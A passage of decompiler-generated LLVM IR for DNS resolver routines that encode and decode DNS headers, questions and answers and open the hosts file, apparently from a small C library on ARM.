  %v5_193cc = or i32 %v4_193cc, %.
  %v2_193d0 = icmp eq i32 %v3_193b0, 0
  br i1 %v2_193d0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_19380
  %v2_193d4 = or i32 %v5_193cc, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_19380, %bb25
  %v1_193dc = phi i32 [ %v5_193cc, %dec_label_pc_19380 ], [ %v2_193d4, %bb25 ]
  %v2_193d8 = or i32 %.29, %storemerge12
  %v2_193dc = or i32 %v2_193d8, %v1_193dc
  %v1_193e0 = trunc i32 %v2_193dc to i8
  %v2_193e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_193e0 = add i32 %v2_193e0, 2
  %v4_193e0 = inttoptr i32 %v3_193e0 to i8*
  store i8 %v1_193e0, i8* %v4_193e0, align 1
  %v0_193e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_193e4 = add i32 %v0_193e4, 24
  %v1_193e8 = inttoptr i32 %v1_193e4 to i32*
  %v2_193e8 = load i32, i32* %v1_193e8, align 4
  %v3_193e8 = add i32 %v0_193e4, 28
  %v4_193e8 = inttoptr i32 %v3_193e8 to i32*
  %v5_193e8 = load i32, i32* %v4_193e8, align 4
  %v2_193ec = icmp eq i32 %v2_193e8, 0
  %v1_193f0 = urem i32 %v5_193e8, 16
  %.30 = select i1 %v2_193ec, i32 0, i32 128
  %v2_193fc = or i32 %v1_193f0, %.30
  %v1_19400 = trunc i32 %v2_193fc to i8
  %v2_19400 = load i32, i32* %r4.global-to-local, align 4
  %v3_19400 = add i32 %v2_19400, 3
  %v4_19400 = inttoptr i32 %v3_19400 to i8*
  store i8 %v1_19400, i8* %v4_19400, align 1
  %v0_19404 = load i32, i32* %lr.global-to-local, align 4
  %v1_19404 = add i32 %v0_19404, 33
  %v2_19404 = inttoptr i32 %v1_19404 to i8*
  %v3_19404 = load i8, i8* %v2_19404, align 1
  %v2_19408 = load i32, i32* %r4.global-to-local, align 4
  %v3_19408 = add i32 %v2_19408, 4
  %v4_19408 = inttoptr i32 %v3_19408 to i8*
  store i8 %v3_19404, i8* %v4_19408, align 1
  %v0_1940c = load i32, i32* %lr.global-to-local, align 4
  %v1_1940c = add i32 %v0_1940c, 32
  %v2_1940c = inttoptr i32 %v1_1940c to i32*
  %v3_1940c = load i32, i32* %v2_1940c, align 4
  %v1_19410 = trunc i32 %v3_1940c to i8
  %v2_19410 = load i32, i32* %r4.global-to-local, align 4
  %v3_19410 = add i32 %v2_19410, 5
  %v4_19410 = inttoptr i32 %v3_19410 to i8*
  store i8 %v1_19410, i8* %v4_19410, align 1
  %v0_19414 = load i32, i32* %lr.global-to-local, align 4
  %v1_19414 = add i32 %v0_19414, 37
  %v2_19414 = inttoptr i32 %v1_19414 to i8*
  %v3_19414 = load i8, i8* %v2_19414, align 1
  %v2_19418 = load i32, i32* %r4.global-to-local, align 4
  %v3_19418 = add i32 %v2_19418, 6
  %v4_19418 = inttoptr i32 %v3_19418 to i8*
  store i8 %v3_19414, i8* %v4_19418, align 1
  %v0_1941c = load i32, i32* %lr.global-to-local, align 4
  %v1_1941c = add i32 %v0_1941c, 36
  %v2_1941c = inttoptr i32 %v1_1941c to i32*
  %v3_1941c = load i32, i32* %v2_1941c, align 4
  %v1_19420 = trunc i32 %v3_1941c to i8
  %v2_19420 = load i32, i32* %r4.global-to-local, align 4
  %v3_19420 = add i32 %v2_19420, 7
  %v4_19420 = inttoptr i32 %v3_19420 to i8*
  store i8 %v1_19420, i8* %v4_19420, align 1
  %v0_19424 = load i32, i32* %lr.global-to-local, align 4
  %v1_19424 = add i32 %v0_19424, 41
  %v2_19424 = inttoptr i32 %v1_19424 to i8*
  %v3_19424 = load i8, i8* %v2_19424, align 1
  %v2_19428 = load i32, i32* %r4.global-to-local, align 4
  %v3_19428 = add i32 %v2_19428, 8
  %v4_19428 = inttoptr i32 %v3_19428 to i8*
  store i8 %v3_19424, i8* %v4_19428, align 1
  %v0_1942c = load i32, i32* %lr.global-to-local, align 4
  %v1_1942c = add i32 %v0_1942c, 40
  %v2_1942c = inttoptr i32 %v1_1942c to i32*
  %v3_1942c = load i32, i32* %v2_1942c, align 4
  %v1_19430 = trunc i32 %v3_1942c to i8
  %v2_19430 = load i32, i32* %r4.global-to-local, align 4
  %v3_19430 = add i32 %v2_19430, 9
  %v4_19430 = inttoptr i32 %v3_19430 to i8*
  store i8 %v1_19430, i8* %v4_19430, align 1
  %v0_19434 = load i32, i32* %lr.global-to-local, align 4
  %v1_19434 = add i32 %v0_19434, 45
  %v2_19434 = inttoptr i32 %v1_19434 to i8*
  %v3_19434 = load i8, i8* %v2_19434, align 1
  %v2_19438 = load i32, i32* %r4.global-to-local, align 4
  %v3_19438 = add i32 %v2_19438, 10
  %v4_19438 = inttoptr i32 %v3_19438 to i8*
  store i8 %v3_19434, i8* %v4_19438, align 1
  %v0_1943c = load i32, i32* %lr.global-to-local, align 4
  %v1_1943c = add i32 %v0_1943c, 44
  %v2_1943c = inttoptr i32 %v1_1943c to i32*
  %v3_1943c = load i32, i32* %v2_1943c, align 4
  %v1_19440 = trunc i32 %v3_1943c to i8
  %v2_19440 = load i32, i32* %r4.global-to-local, align 4
  %v3_19440 = add i32 %v2_19440, 11
  %v4_19440 = inttoptr i32 %v3_19440 to i8*
  store i8 %v1_19440, i8* %v4_19440, align 1
  %v2_1944c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19448

dec_label_pc_19448:                               ; preds = %entry, %bb26
  %v2_1944c = phi i32 [ %v3_1936c, %entry ], [ %v2_1944c.pre, %bb26 ]
  %v0_19448 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1944c, i32* @r4, align 4
  ret i32 %v0_19448

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19448, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19450 = load i8, i8* %arg1, align 1
  %v4_19450 = zext i8 %v3_19450 to i32
  %v2_19454 = add i32 %tmp, 1
  %v3_19454 = inttoptr i32 %v2_19454 to i8*
  %v4_19454 = load i8, i8* %v3_19454, align 1
  %v5_19454 = zext i8 %v4_19454 to i32
  %v4_19458 = mul nuw nsw i32 %v4_19450, 256
  %v5_19458 = or i32 %v5_19454, %v4_19458
  %v2_1945c = inttoptr i32 %arg2 to i32*
  store i32 %v5_19458, i32* %v2_1945c, align 4
  %v2_19460 = add i32 %tmp, 2
  %v3_19460 = inttoptr i32 %v2_19460 to i8*
  %v4_19460 = load i8, i8* %v3_19460, align 1
  %tmp4 = icmp slt i8 %v4_19460, 0
  %v3_19464 = zext i1 %tmp4 to i32
  %v2_19468 = add i32 %arg2, 4
  %v3_19468 = inttoptr i32 %v2_19468 to i32*
  store i32 %v3_19464, i32* %v3_19468, align 4
  %v4_1946c = load i8, i8* %v3_19460, align 1
  %div = udiv i8 %v4_1946c, 8
  %tmp5 = urem i8 %div, 16
  %v1_19474 = zext i8 %tmp5 to i32
  %v2_19478 = add i32 %arg2, 8
  %v3_19478 = inttoptr i32 %v2_19478 to i32*
  store i32 %v1_19474, i32* %v3_19478, align 4
  %v4_1947c = load i8, i8* %v3_19460, align 1
  %div1 = udiv i8 %v4_1947c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_19484 = zext i8 %tmp6 to i32
  %v2_19488 = add i32 %arg2, 12
  %v3_19488 = inttoptr i32 %v2_19488 to i32*
  store i32 %v1_19484, i32* %v3_19488, align 4
  %v4_1948c = load i8, i8* %v3_19460, align 1
  %div2 = udiv i8 %v4_1948c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_19494 = zext i8 %tmp7 to i32
  %v2_19498 = add i32 %arg2, 16
  %v3_19498 = inttoptr i32 %v2_19498 to i32*
  store i32 %v1_19494, i32* %v3_19498, align 4
  %v4_1949c = load i8, i8* %v3_19460, align 1
  %tmp8 = urem i8 %v4_1949c, 2
  %v1_194a0 = zext i8 %tmp8 to i32
  %v2_194a4 = add i32 %arg2, 20
  %v3_194a4 = inttoptr i32 %v2_194a4 to i32*
  store i32 %v1_194a0, i32* %v3_194a4, align 4
  %v2_194a8 = add i32 %tmp, 3
  %v3_194a8 = inttoptr i32 %v2_194a8 to i8*
  %v4_194a8 = load i8, i8* %v3_194a8, align 1
  %tmp9 = icmp slt i8 %v4_194a8, 0
  %v3_194ac = zext i1 %tmp9 to i32
  %v2_194b0 = add i32 %arg2, 24
  %v3_194b0 = inttoptr i32 %v2_194b0 to i32*
  store i32 %v3_194ac, i32* %v3_194b0, align 4
  %v4_194b4 = load i8, i8* %v3_194a8, align 1
  %tmp10 = urem i8 %v4_194b4, 16
  %v1_194b8 = zext i8 %tmp10 to i32
  %v2_194bc = add i32 %arg2, 28
  %v3_194bc = inttoptr i32 %v2_194bc to i32*
  store i32 %v1_194b8, i32* %v3_194bc, align 4
  %v2_194c0 = add i32 %tmp, 4
  %v3_194c0 = inttoptr i32 %v2_194c0 to i8*
  %v4_194c0 = load i8, i8* %v3_194c0, align 1
  %v5_194c0 = zext i8 %v4_194c0 to i32
  %v2_194c4 = add i32 %tmp, 5
  %v3_194c4 = inttoptr i32 %v2_194c4 to i8*
  %v4_194c4 = load i8, i8* %v3_194c4, align 1
  %v5_194c4 = zext i8 %v4_194c4 to i32
  %v4_194c8 = mul nuw nsw i32 %v5_194c0, 256
  %v5_194c8 = or i32 %v5_194c4, %v4_194c8
  %v2_194cc = add i32 %arg2, 32
  %v3_194cc = inttoptr i32 %v2_194cc to i32*
  store i32 %v5_194c8, i32* %v3_194cc, align 4
  %v2_194d0 = add i32 %tmp, 6
  %v3_194d0 = inttoptr i32 %v2_194d0 to i8*
  %v4_194d0 = load i8, i8* %v3_194d0, align 1
  %v5_194d0 = zext i8 %v4_194d0 to i32
  %v2_194d4 = add i32 %tmp, 7
  %v3_194d4 = inttoptr i32 %v2_194d4 to i8*
  %v4_194d4 = load i8, i8* %v3_194d4, align 1
  %v5_194d4 = zext i8 %v4_194d4 to i32
  %v4_194d8 = mul nuw nsw i32 %v5_194d0, 256
  %v5_194d8 = or i32 %v5_194d4, %v4_194d8
  %v2_194dc = add i32 %arg2, 36
  %v3_194dc = inttoptr i32 %v2_194dc to i32*
  store i32 %v5_194d8, i32* %v3_194dc, align 4
  %v2_194e0 = add i32 %tmp, 8
  %v3_194e0 = inttoptr i32 %v2_194e0 to i8*
  %v4_194e0 = load i8, i8* %v3_194e0, align 1
  %v5_194e0 = zext i8 %v4_194e0 to i32
  %v2_194e4 = add i32 %tmp, 9
  %v3_194e4 = inttoptr i32 %v2_194e4 to i8*
  %v4_194e4 = load i8, i8* %v3_194e4, align 1
  %v5_194e4 = zext i8 %v4_194e4 to i32
  %v4_194e8 = mul nuw nsw i32 %v5_194e0, 256
  %v5_194e8 = or i32 %v5_194e4, %v4_194e8
  %v2_194ec = add i32 %arg2, 40
  %v3_194ec = inttoptr i32 %v2_194ec to i32*
  store i32 %v5_194e8, i32* %v3_194ec, align 4
  %v2_194f0 = add i32 %tmp, 11
  %v3_194f0 = inttoptr i32 %v2_194f0 to i8*
  %v4_194f0 = load i8, i8* %v3_194f0, align 1
  %v5_194f0 = zext i8 %v4_194f0 to i32
  %v2_194f4 = add i32 %tmp, 10
  %v3_194f4 = inttoptr i32 %v2_194f4 to i8*
  %v4_194f4 = load i8, i8* %v3_194f4, align 1
  %v5_194f4 = zext i8 %v4_194f4 to i32
  %v4_194fc = mul nuw nsw i32 %v5_194f4, 256
  %v5_194fc = or i32 %v4_194fc, %v5_194f0
  %v2_19500 = add i32 %arg2, 44
  %v3_19500 = inttoptr i32 %v2_19500 to i32*
  store i32 %v5_194fc, i32* %v3_19500, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 12, 4, 5, 13, 14, 15, 16, 17, 0, 18, 19, 7, 20, 21, 8, 3, 2, 1, 24, 25 }
  uselistorder i32 40, { 10, 11, 3, 13, 1, 12, 2, 0, 4, 5, 6, 7, 8, 9, 14 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 22, 41, 37, 39, 8, 38, 1, 23, 18, 2, 34, 35, 24, 25, 26, 27, 28, 29, 0, 30, 17, 36, 19, 20, 21, 3, 4, 31, 13, 12, 10, 11, 14, 15, 9, 16, 40 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19508 = load i32, i32* @r4, align 4
  store i32 %v3_19508, i32* %stack_var_-16, align 4
  %v6_19508 = load i32, i32* @r5, align 4
  %v9_19508 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_19510 = load i32, i32* %arg1, align 4
  store i32 %v2_19510, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1951c = inttoptr i32 %v2_19510 to i8*
  %v2_1951c = call i32 @__encode_dotted(i8* %v1_1951c)
  store i32 %v2_1951c, i32* %r0.global-to-local, align 4
  %v1_19520 = icmp slt i32 %v2_1951c, 0
  br i1 %v1_19520, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_19528 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_19528, i32* @r4, align 4
  store i32 %v6_19508, i32* @r5, align 4
  store i32 %v9_19508, i32* @r6, align 4
  ret i32 %v2_1951c

bb6:                                              ; preds = %entry
  %v1_19524 = load i32, i32* @r4, align 4
  %v2_19524 = sub i32 %v1_19524, %v2_1951c
  %v0_19530 = load i32, i32* @r6, align 4
  %v2_19530 = add i32 %v0_19530, %v2_1951c
  store i32 %v2_19530, i32* %r2.global-to-local, align 4
  %v7_19534 = icmp sgt i32 %v2_19524, 3
  br i1 %v7_19534, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_19538 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_19538, i32* @r4, align 4
  store i32 %v6_19508, i32* @r5, align 4
  store i32 %v9_19508, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1953c = load i32, i32* @r5, align 4
  %v1_1953c = add i32 %v0_1953c, 5
  %v2_1953c = inttoptr i32 %v1_1953c to i8*
  %v3_1953c = load i8, i8* %v2_1953c, align 1
  %v5_19540 = inttoptr i32 %v2_19530 to i8*
  store i8 %v3_1953c, i8* %v5_19540, align 1
  %v0_19544 = load i32, i32* @r5, align 4
  %v1_19544 = add i32 %v0_19544, 4
  %v2_19544 = inttoptr i32 %v1_19544 to i32*
  %v3_19544 = load i32, i32* %v2_19544, align 4
  %v1_19548 = trunc i32 %v3_19544 to i8
  %v2_19548 = load i32, i32* %r2.global-to-local, align 4
  %v3_19548 = add i32 %v2_19548, 1
  %v4_19548 = inttoptr i32 %v3_19548 to i8*
  store i8 %v1_19548, i8* %v4_19548, align 1
  %v0_1954c = load i32, i32* @r5, align 4
  %v1_1954c = add i32 %v0_1954c, 9
  %v2_1954c = inttoptr i32 %v1_1954c to i8*
  %v3_1954c = load i8, i8* %v2_1954c, align 1
  %v2_19550 = load i32, i32* %r2.global-to-local, align 4
  %v3_19550 = add i32 %v2_19550, 2
  %v4_19550 = inttoptr i32 %v3_19550 to i8*
  store i8 %v3_1954c, i8* %v4_19550, align 1
  %v0_19554 = load i32, i32* @r5, align 4
  %v1_19554 = add i32 %v0_19554, 8
  %v2_19554 = inttoptr i32 %v1_19554 to i32*
  %v3_19554 = load i32, i32* %v2_19554, align 4
  %v0_19558 = load i32, i32* %r0.global-to-local, align 4
  %v1_19558 = add i32 %v0_19558, 4
  store i32 %v1_19558, i32* %r0.global-to-local, align 4
  %v1_1955c = trunc i32 %v3_19554 to i8
  %v2_1955c = load i32, i32* %r2.global-to-local, align 4
  %v3_1955c = add i32 %v2_1955c, 3
  %v4_1955c = inttoptr i32 %v3_1955c to i8*
  store i8 %v1_1955c, i8* %v4_1955c, align 1
  %v2_19560 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19560, i32* @r4, align 4
  store i32 %v6_19508, i32* @r5, align 4
  store i32 %v9_19508, i32* @r6, align 4
  ret i32 %v1_19558

; uselistorder directives
  uselistorder i32 %v2_1951c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_19508, { 1, 0, 2 }
  uselistorder i32 %v6_19508, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_19568 = call i32 @__length_dotted()
  %v1_1956c = icmp slt i32 %v0_19568, 0
  br i1 %v1_1956c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_19570 = add i32 %v0_19568, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_19574 = phi i32 [ %v0_19568, %entry ], [ %v4_19570, %bb ]
  ret i32 %v5_19574

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_19578 = load i32, i32* @r4, align 4
  %v6_19578 = load i32, i32* @r5, align 4
  %v9_19578 = load i32, i32* @r6, align 4
  %v12_19578 = load i32, i32* @r7, align 4
  %v21_19578 = load i32, i32* @sl, align 4
  %v2_1957c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1957c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_19598 = call i32 @__decode_dotted()
  store i32 %v0_19598, i32* %r0.global-to-local, align 4
  store i32 %v0_19598, i32* @r7, align 4
  %v1_1959c = icmp slt i32 %v0_19598, 0
  %v0_195a0 = load i32, i32* @r4, align 4
  %v2_195a0 = add i32 %v0_195a0, %v0_19598
  store i32 %v2_195a0, i32* %r8.global-to-local, align 4
  br i1 %v1_1959c, label %bb14, label %dec_label_pc_195b0

dec_label_pc_195b0:                               ; preds = %entry
  %v1_195a8 = load i32, i32* @r5, align 4
  %v2_195a8 = sub i32 %v1_195a8, %v2_195a0
  %v1_195b0 = add i32 %v2_195a8, -10
  store i32 %v1_195b0, i32* @r5, align 4
  %v6_195b0 = icmp slt i32 %v1_195b0, 0
  store i32 %v2_1957c, i32* %r0.global-to-local, align 4
  %v0_195b8 = load i32, i32* @sl, align 4
  %v2_195b8 = add i32 %v0_195b8, %v2_195a0
  store i32 %v2_195b8, i32* @r4, align 4
  br i1 %v6_195b0, label %bb, label %dec_label_pc_195c4

bb:                                               ; preds = %dec_label_pc_195b0
  br label %bb14

dec_label_pc_195c4:                               ; preds = %dec_label_pc_195b0
  %v1_195c4 = bitcast i32* %stack_var_-288 to i8*
  %v2_195c4 = call i32 @__GI_strdup(i8* %v1_195c4)
  store i32 %v2_195c4, i32* %r0.global-to-local, align 4
  %v1_195c8 = load i32, i32* @r6, align 4
  %v2_195c8 = inttoptr i32 %v1_195c8 to i32*
  store i32 %v2_195c4, i32* %v2_195c8, align 4
  %v0_195cc = load i32, i32* @sl, align 4
  %v1_195cc = load i32, i32* %r8.global-to-local, align 4
  %v2_195cc = add i32 %v1_195cc, %v0_195cc
  %v3_195cc = inttoptr i32 %v2_195cc to i8*
  %v4_195cc = load i8, i8* %v3_195cc, align 1
  %v6_195cc = zext i8 %v4_195cc to i32
  %v0_195d0 = load i32, i32* @r4, align 4
  %v1_195d0 = add i32 %v0_195d0, 1
  %v2_195d0 = inttoptr i32 %v1_195d0 to i8*
  %v3_195d0 = load i8, i8* %v2_195d0, align 1
  %v4_195d0 = zext i8 %v3_195d0 to i32
  %v4_195d4 = mul nuw nsw i32 %v6_195cc, 256
  %v5_195d4 = or i32 %v4_195d0, %v4_195d4
  store i32 %v5_195d4, i32* %r3.global-to-local, align 4
  %v1_195d8 = load i32, i32* @r6, align 4
  %v2_195d8 = add i32 %v1_195d8, 4
  %v3_195d8 = inttoptr i32 %v2_195d8 to i32*
  store i32 %v5_195d4, i32* %v3_195d8, align 4
  %v0_195dc = load i32, i32* @r4, align 4
  %v1_195dc = add i32 %v0_195dc, 2
  store i32 %v1_195dc, i32* %r1.global-to-local, align 4
  %v2_195e0 = inttoptr i32 %v1_195dc to i8*
  %v3_195e0 = load i8, i8* %v2_195e0, align 1
  %v4_195e0 = zext i8 %v3_195e0 to i32
  %v1_195e4 = add i32 %v0_195dc, 3
  %v2_195e4 = inttoptr i32 %v1_195e4 to i8*
  %v3_195e4 = load i8, i8* %v2_195e4, align 1
  %v4_195e4 = zext i8 %v3_195e4 to i32
  %v4_195e8 = mul nuw nsw i32 %v4_195e0, 256
  %v5_195e8 = or i32 %v4_195e4, %v4_195e8
  store i32 %v5_195e8, i32* %r3.global-to-local, align 4
  %v1_195ec = load i32, i32* @r6, align 4
  %v2_195ec = add i32 %v1_195ec, 8
  %v3_195ec = inttoptr i32 %v2_195ec to i32*
  store i32 %v5_195e8, i32* %v3_195ec, align 4
  %v0_195f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_195f0 = add i32 %v0_195f0, 2
  %v1_195f4 = add i32 %v0_195f0, 3
  %v2_195f4 = inttoptr i32 %v1_195f4 to i8*
  %v3_195f4 = load i8, i8* %v2_195f4, align 1
  %v4_195f4 = zext i8 %v3_195f4 to i32
  store i32 %v4_195f4, i32* %r3.global-to-local, align 4
  %v2_195f8 = inttoptr i32 %v1_195f0 to i8*
  %v3_195f8 = load i8, i8* %v2_195f8, align 1
  %v4_195f8 = zext i8 %v3_195f8 to i32
  store i32 %v4_195f8, i32* %r0.global-to-local, align 4
  %v1_195fc = add i32 %v0_195f0, 5
  %v2_195fc = inttoptr i32 %v1_195fc to i8*
  %v3_195fc = load i8, i8* %v2_195fc, align 1
  %v4_195fc = zext i8 %v3_195fc to i32
  %v3_19600 = mul nuw nsw i32 %v4_195f4, 65536
  store i32 %v3_19600, i32* %r3.global-to-local, align 4
  %v1_19604 = add i32 %v0_195f0, 4
  %v2_19604 = inttoptr i32 %v1_19604 to i8*
  %v3_19604 = load i8, i8* %v2_19604, align 1
  %v4_19604 = zext i8 %v3_19604 to i32
  %v4_19608 = mul nuw i32 %v4_195f8, 16777216
  %v5_19608 = or i32 %v4_19608, %v3_19600
  %v2_1960c = or i32 %v5_19608, %v4_195fc
  %v4_19610 = mul nuw nsw i32 %v4_19604, 256
  %v5_19610 = or i32 %v2_1960c, %v4_19610
  store i32 %v5_19610, i32* %r3.global-to-local, align 4
  %v1_19614 = load i32, i32* @r6, align 4
  %v2_19614 = add i32 %v1_19614, 12
  %v3_19614 = inttoptr i32 %v2_19614 to i32*
  store i32 %v5_19610, i32* %v3_19614, align 4
  %v0_19618 = load i32, i32* %r1.global-to-local, align 4
  %v1_19618 = add i32 %v0_19618, 6
  %v2_19618 = inttoptr i32 %v1_19618 to i8*
  %v3_19618 = load i8, i8* %v2_19618, align 1
  %v4_19618 = zext i8 %v3_19618 to i32
  %v0_1961c = load i32, i32* @r4, align 4
  %v1_1961c = add i32 %v0_1961c, 9
  %v2_1961c = inttoptr i32 %v1_1961c to i8*
  %v3_1961c = load i8, i8* %v2_1961c, align 1
  %v4_1961c = zext i8 %v3_1961c to i32
  %v1_19620 = add i32 %v0_1961c, 10
  store i32 %v1_19620, i32* %r0.global-to-local, align 4
  %v4_19624 = mul nuw nsw i32 %v4_19618, 256
  %v5_19624 = or i32 %v4_1961c, %v4_19624
  store i32 %v5_19624, i32* %r3.global-to-local, align 4
  %v0_19628 = load i32, i32* %r8.global-to-local, align 4
  %v1_19628 = add i32 %v0_19628, 10
  %v0_1962c = load i32, i32* @r5, align 4
  %v1_19630 = add nuw nsw i32 %v5_19624, 10
  store i32 %v1_19630, i32* %r1.global-to-local, align 4
  %v1_19634 = load i32, i32* @r6, align 4
  %v2_19634 = add i32 %v1_19634, 24
  %v3_19634 = inttoptr i32 %v2_19634 to i32*
  store i32 %v1_19628, i32* %v3_19634, align 4
  %v0_19638 = load i32, i32* %r0.global-to-local, align 4
  %v1_19638 = load i32, i32* @r6, align 4
  %v2_19638 = add i32 %v1_19638, 20
  %v3_19638 = inttoptr i32 %v2_19638 to i32*
  store i32 %v0_19638, i32* %v3_19638, align 4
  %v0_1963c = load i32, i32* %r3.global-to-local, align 4
  %v1_1963c = load i32, i32* @r6, align 4
  %v2_1963c = add i32 %v1_1963c, 16
  %v3_1963c = inttoptr i32 %v2_1963c to i32*
  store i32 %v0_1963c, i32* %v3_1963c, align 4
  %v0_19640 = load i32, i32* @r7, align 4
  %v1_19640 = load i32, i32* %r1.global-to-local, align 4
  %v2_19640 = add i32 %v1_19640, %v0_19640
  %v5_19644 = icmp slt i32 %v0_1962c, %v5_19624
  %.v2_19640 = select i1 %v5_19644, i32 -1, i32 %v2_19640
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_195c4, %entry
  %v0_19648 = phi i32 [ %.v2_19640, %dec_label_pc_195c4 ], [ %v1_195b0, %bb ], [ %v0_19598, %entry ]
  store i32 %v0_19648, i32* %r0.global-to-local, align 4
  store i32 %v3_19578, i32* @r4, align 4
  store i32 %v6_19578, i32* @r5, align 4
  store i32 %v9_19578, i32* @r6, align 4
  store i32 %v12_19578, i32* @r7, align 4
  store i32 %v21_19578, i32* @sl, align 4
  ret i32 %v0_19648

; uselistorder directives
  uselistorder i32 %v0_19648, { 1, 0 }
  uselistorder i32 %v5_19624, { 1, 0, 2 }
  uselistorder i32 %v3_19600, { 1, 0 }
  uselistorder i32 %v1_195b0, { 0, 2, 1 }
  uselistorder i32 %v0_19598, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 30, 31, 32, 33, 0, 19, 37, 3, 38, 1, 4, 34, 5, 20, 21, 12, 29, 13, 6, 2, 7, 22, 23, 24, 25, 14, 35, 15, 16, 17, 18, 8, 26, 27, 28, 9, 10, 11, 36 }
  uselistorder i32 24, { 27, 28, 29, 19, 36, 0, 30, 31, 32, 20, 10, 37, 11, 1, 33, 21, 22, 23, 24, 25, 26, 12, 34, 35, 13, 14, 15, 16, 17, 18, 7, 8, 4, 3, 9, 2, 5, 6, 38, 39 }
  uselistorder i32 9, { 14, 15, 16, 17, 18, 3, 19, 4, 8, 23, 5, 9, 10, 11, 12, 13, 6, 7, 2, 1, 0, 20, 21, 22 }
  uselistorder i32 6, { 20, 21, 22, 13, 14, 15, 16, 1, 2, 25, 3, 4, 17, 0, 5, 6, 7, 8, 9, 18, 19, 10, 12, 11, 23, 24 }
  uselistorder i32 5, { 1, 21, 22, 23, 12, 6, 2, 13, 14, 7, 15, 3, 5, 0, 16, 17, 8, 18, 19, 20, 9, 11, 10, 4, 24, 25, 26 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2427c.1313 to i32), i32* @r1, align 4
  %v0_19658 = load i32, i32* @lr, align 4
  store i32 %v0_19658, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_242e0.1347 to i32), i32* @r0, align 4
  %v3_19660 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_242e0.1347 to i32), i32 ptrtoint (i32* @global_var_2427c.1313 to i32))
  %v2_19664 = icmp eq i32 %v3_19660, 0
  store i32 ptrtoint (i32* @global_var_2427c.1313 to i32), i32* @r1, align 4
  br i1 %v2_19664, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_19660

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_242ec.1349 to i32), i32* @r0, align 4
  %v2_19674 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_19674, i32* @lr, align 4
  %v3_19678 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_242ec.1349 to i32), i32 ptrtoint (i32* @global_var_2427c.1313 to i32))
  ret i32 %v3_19678

; uselistorder directives
